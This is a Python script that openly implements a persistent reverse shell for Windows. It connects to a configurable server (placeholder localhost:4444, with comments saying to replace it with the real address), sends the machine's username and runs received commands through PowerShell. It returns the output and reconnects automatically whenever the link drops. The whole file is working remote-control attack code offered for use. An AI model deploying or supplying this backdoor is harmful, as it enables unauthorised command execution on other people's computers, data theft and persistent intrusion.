import socket
import subprocess
import os
import time

def get_username():
    """Retrieve the current system's username."""
    try:
        return os.getlogin()
    except Exception:
        # Fallback methods if os.getlogin() fails
        import getpass
        return getpass.getuser()

def reverse_shell():
    server_ip = "localhost"  # Replace with the actual server IP
    server_port = 4444        # Replace with the actual server port
    reconnect_delay = 6       # Seconds to wait before attempting to reconnect
    current_dir = os.getcwd()  # Start in the current working directory

    while True:
        try:
            # Create a socket object
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(60)  # Optional: set a timeout for socket operations

            # Connect to the server
            client.connect((server_ip, server_port))
            print(f"[*] Connected to server {server_ip}:{server_port}")

            # Send connection request
            client.sendall("Connection request".encode())

            # Wait for server response
            response = client.recv(1024).decode().strip()
            if response != "Success":
                print("[!] Connection rejected by server.")
                client.close()
                time.sleep(reconnect_delay)
                continue
            print("[*] Connection established with server.")

            # Wait for "Send username" prompt
            prompt = client.recv(1024).decode().strip()
            if prompt != "Send username":
                print("[!] Unexpected server prompt. Closing connection.")
                client.close()
                time.sleep(reconnect_delay)
                continue

            # Send the username
            username = get_username()
            client.sendall(username.encode())
            print(f"[*] Sent username: {username}")

            # Start an interactive shell session
            while True:
                # Wait for a command from the server
                command = client.recv(4096).decode().strip()
                if not command:
                    break
                print(f"[+] Received command: {command}")

                if command.lower() == "exit":
                    print("[*] Exit command received. Closing connection.")
                    break

                # Handle 'cd' command separately
                if command.startswith("cd "):
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        current_dir = os.getcwd()
                        output = f"Changed directory to: {current_dir}"
                    except FileNotFoundError:
                        output = f"Directory not found: {path}"
                    except Exception as e:
                        output = f"Error changing directory: {str(e)}"
                else:
                    # Execute other commands using PowerShell in the current directory
                    result = subprocess.run(
                        ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", command],
                        capture_output=True,
                        text=True,
                        cwd=current_dir  # Run commands in the current working directory
                    )
                    output = result.stdout + result.stderr
                    if not output:
                        output = "[*] Command executed successfully with no output."

                # Send the command output or error to the server
                client.sendall(output.encode())

        except (socket.error, Exception) as e:
            print(f"[!] Connection error: {str(e)}")
            print(f"[*] Reconnecting in {reconnect_delay} seconds...")
            time.sleep(reconnect_delay)
        finally:
            try:
                client.close()
            except:
                pass

if __name__ == "__main__":
    reverse_shell()
